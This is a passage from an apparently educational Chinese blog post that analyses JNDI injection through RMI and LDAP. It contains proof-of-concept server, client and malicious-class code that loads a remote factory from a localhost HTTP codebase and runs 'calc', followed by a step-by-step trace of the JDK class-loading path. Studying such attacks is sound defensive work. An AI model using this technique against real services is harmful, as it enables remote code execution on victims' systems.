<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们想，他这里会不会是调用的原生rmi的方法，我们跟进去看一下</p>
<p>最后走到了<code>RegistryContext#lookup</code>的方法，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以看到，调用的是<code>RegistryImpl_Stub</code>的lookup方法</p>
<p>那我们就能知道了，实际这里调用的就是rmi原生的lookup方法</p>
<p>如果说服务端lookup中的参数可控的话，我们就可以用它来查询我们构造的恶意对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736589928418-eeea02a8-f39b-47f5-b206-255ddc93955e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736589928418-eeea02a8-f39b-47f5-b206-255ddc93955e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="HIr5E">JNDI结合RMI</h2>
<h3 id="xGqJQ">引用对象</h3>
在目录存储对象中支持以下几种对象

<ul>
<li>java可序列化对象</li>
<li>引用对象</li>
<li>属性对象</li>
<li>远程对象</li>
<li>CORBA对象</li>
</ul>
<p>平时我们所说的JNDI所指的是<strong>引用对象</strong></p>
<p>我们先来看看，引用对象创建的几个参数</p>
<p>第一个是类名，第二个是工厂名，第三个是工厂的位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(className);</span><br><span class="line">        classFactory = factory;</span><br><span class="line">        classFactoryLocation = factoryLocation;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="leUiH">实现</h3>

<p>来看一下它的实现，创建一个引用对象，将TestRef类和TestRef工厂绑定到<code>http://localhost:7777</code>下面，再将<strong>引用对象</strong>绑定到<code>rmi://localhost:1099/remoteObj</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://127.0.0.1:1099/remoteObj&quot;,new RemoteObjImpl());</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,refObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们这里构造一个恶意类，写入可以弹出计算器的恶意代码</p>
<p>编译好后放在一个文件夹下，开启一个http服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736592223285-925e1da9-5d1e-4723-8b64-f446cfd067ae.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736592223285-925e1da9-5d1e-4723-8b64-f446cfd067ae.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后用JNDI客户端去调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终成功弹出计算机</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736597825736-6b8ac8f4-9a3b-4adb-9ffc-934b1f8fab53.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736597825736-6b8ac8f4-9a3b-4adb-9ffc-934b1f8fab53.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="DDBMN">小tip</h4>

<p>由于调用恶意类的构造函数实在客户端（被攻击端）上执行，所以在编译时候，恶意类的开头不可以带<code>package</code>，否则会报出<code>NoClassDefFoundError</code>错误。</p>
<h3 id="Oa7Ym">流程分析</h3>
其中具体的流程我们也来跟一下

<p>刚才我们也说了，实际它是调用rmi原生的lookup方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>从lookup方法得到对象后，发现是一个<code>ReferenceWrapper_Stub</code>对象，而我们实际绑定的是<code>Reference</code>对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736598520877-027f3360-b23b-4d9a-9c53-456461c74054.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736598520877-027f3360-b23b-4d9a-9c53-456461c74054.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>绑定的是<code>Reference</code>而查看的时候是<code>ReferenceWrapper_Stub</code>，那问题肯定出在rebind方法上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,refObj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>走入函数里看一下，在调用<code>RegistryImpl_Stub</code>的<code>rebind</code>方法时候，名字还是我们传入的名字，而传入的方法是经过了<code>encodeObject</code>之后的对象，也就是对对象进行了一层封装</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rebind</span><span class="params">(Name var1, Object var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidNameException</span>(<span class="string">&quot;RegistryContext: Cannot rebind empty name&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.registry.rebind(var1.get(<span class="number">0</span>), <span class="built_in">this</span>.encodeObject(var2, var1.getPrefix(<span class="number">1</span>)));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var4).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看一下<code>encodeObject</code>函数的逻辑</p>
<p>如果该对象是一个<code>Reference</code>对象的话，那么就封装进<code>ReferenceWrapper</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Remote <span class="title function_">encodeObject</span><span class="params">(Object var1, Name var2)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        var1 = NamingManager.getStateToBind(var1, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Remote)var1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>((Reference)var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(((Referenceable)var1).getReference());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;RegistryContext: object to bind must be Remote, Reference, or Referenceable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们看一下客户端<code>lookup</code>的逻辑</p>
<p>在<code>RegistryContext</code>的<code>lookup</code>方法中，我们看到了调用rmi原生<code>lookup</code>的地方，将找到的对象存入var2中（<code>ReferenceWrapper_Stub</code>）</p>
<p>在该方法的最后，我们可以看到想对应的<code>decodeObject</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里这个方法就是将接受到的<code>ReferenceWrapper_Stub</code>对象，变为我们开始创建的<code>Reference</code>对象</p>
<p>我们快走出<code>RegistryContext</code>类了，但是还是没有对恶意类进行初始化，也就是说，类加载机制是<strong>和容器协议无关</strong>的</p>
<p>return时会走入<code>NamingManager</code>的<code>getObjectInstance</code>方法内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看到<code>NamingManager#getObjectInstance</code>，其中有个<code>getObjectFactoryFromReference</code>方法是比较重要的，从名字可以看出来，从引用中得到工厂对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try using any specified factories</span></span><br><span class="line">        answer =</span><br><span class="line">            createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">        <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>从该方法中可以找进行<strong>工厂类的类加载</strong>位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入loadClass方法，首先使用的类加载器是<code>AppClassLoader</code>，在本地去寻找，但是本地是肯定找不到的，再近一步</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; loadClass(String className, ClassLoader cl)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(className, <span class="literal">true</span>, cl);</span><br><span class="line">        <span class="keyword">return</span> cls;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>没找到的话，会从codebase中寻找，找到的话，就会用codebase去进行类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里新建了一个URLClassLoader，将codebase传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                 URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在return中的<code>loadClass</code>中，会去cl中的url路径下找类，然后进行加载</p>
<p>同时这个加载也是进行初始化的加载，若我的恶意代码写在静态代码块的地方，现在计算机已经弹出来了，但是我们的恶意代写在的是构造函数中，必须需要实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; loadClass(String className, ClassLoader cl)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(className, <span class="literal">true</span>, cl);</span><br><span class="line">        <span class="keyword">return</span> cls;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736600826484-ccf9d3e1-7991-44cc-a742-cb748f91b72a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736600826484-ccf9d3e1-7991-44cc-a742-cb748f91b72a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>而实例化刚好在<code>getObjectFactoryFromReference</code>之中，实例化后就执行了恶意的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="xqvll">总结</h3>
这里存在两个攻击面：

<ol>
<li>rmi原生问题（这里就没有演示了）</li>
<li>jndi注入</li>
</ol>
<h2 id="eFuEZ">JNDI结合LDAP</h2>
LDAP不是java的东西，而是一个通用协议

<p>在jdk8u121后，修复了RMI和COBAR的攻击点，唯独漏下一个LDAP（8u191），所以我们接下来看一下</p>
<h3 id="HCpu2">实现</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>, refObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们使用<font style="color:rgb(51, 51, 51);">apache Directory Studio来创建一个LDAP服务</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736740682898-bf498bf2-8737-4f3c-9296-80dcb0faa229.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736740682898-bf498bf2-8737-4f3c-9296-80dcb0faa229.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>启动起来**（这里搞了好久，最后更换jdk11才成功启动）**</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742486383-3e11b932-8373-41ff-b681-b1858ecf1ec6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742486383-3e11b932-8373-41ff-b681-b1858ecf1ec6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们这里可以看到，已经成功绑定上去了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742565713-b5089d07-f12d-4552-a977-958653a3a708.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742565713-b5089d07-f12d-4552-a977-958653a3a708.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后我们创建一个客户端，使用lookup方法去查找一下（还和之前一样，在TestRef.class的位置开启一个http服务）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将LDAP客户端运行起来，就成功弹出了计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742972042-dcf6e9a9-ed0f-4e5d-a175-2454b7d0a6a1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736742972042-dcf6e9a9-ed0f-4e5d-a175-2454b7d0a6a1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="vVqbv">分析</h3>

<p>经过一系列的<code>lookup</code>调用，最终走到了<code>LdapCtx#c_lookup</code>中，通过调用<code>DirectoryManager.getObjectInstance</code>，走出协议对应的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">c_lookup</span><span class="params">(Name var1, Continuation var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        var2.setError(<span class="built_in">this</span>, var1);</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> DirectoryManager.getObjectInstance(var3, var1, <span class="built_in">this</span>, <span class="built_in">this</span>.envprops, (Attributes)var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2.fillInException(var16);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var24</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;problem generating object using object factory&quot;</span>);</span><br><span class="line">            var24.setRootCause(var17);</span><br><span class="line">            <span class="keyword">throw</span> var2.fillInException(var24);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>走入<code>DirectoryManager#getObjectInstance</code>后，我们发现和rmi的的后半段是基本一样的，进入<code>getObjectFactoryFromReference</code></p>
